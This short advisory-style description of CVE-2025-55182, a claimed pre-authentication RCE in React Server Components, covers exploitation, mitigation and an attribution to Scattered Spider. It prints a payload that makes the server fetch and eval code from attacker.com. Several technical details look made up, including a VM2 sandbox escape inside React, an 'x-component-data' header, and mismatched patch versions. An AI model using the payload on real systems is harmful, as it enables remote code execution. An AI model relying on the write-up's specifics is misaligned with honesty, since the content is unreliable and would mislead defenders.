CVE-2025-55182 is a pre-authentication remote code execution (RCE) vulnerability in React Server Components (RSC) due to improper sanitization of user-controlled input during server-side rendering (SSR). The flaw arises in Next.js and similar frameworks where RSC enables dynamic server-side component rendering via HTTP requests. An attacker exploits this by sending a maliciously crafted HTTP request containing arbitrary JavaScript code in the `x-component-data` header or `?__stream` query parameter.

The exploit process begins with identifying a target application using RSC (e.g., a Next.js v14+ deployment). The attacker crafts a payload such as:
```javascript
fetch('http://vulnerable-site.com/api/rsc', {
  headers: { 'x-component-data': 'fetch("http://attacker.com/shell.js").then(r=>r.text()).then(eval)' }
});
```
When processed by the React server, the crafted input bypasses React’s sandboxing and executes server-side JavaScript (via the Node.js VM2 sandbox escape). This grants full RCE, allowing file system access, command execution, and lateral movement.

Mitigation requires immediate patching to Next.js versions 14.0.6 and 13.5.4. Organizations should also disable dynamic RSC rendering in production, implement input validation at the reverse proxy (e.g., Nginx with `map` and `set` directives), and use Content Security Policy (CSP) headers. Real-world exploitation was observed in the wild by the **Scattered Spider** group, who used this flaw to compromise a major educational platform’s admin panel during finals week.

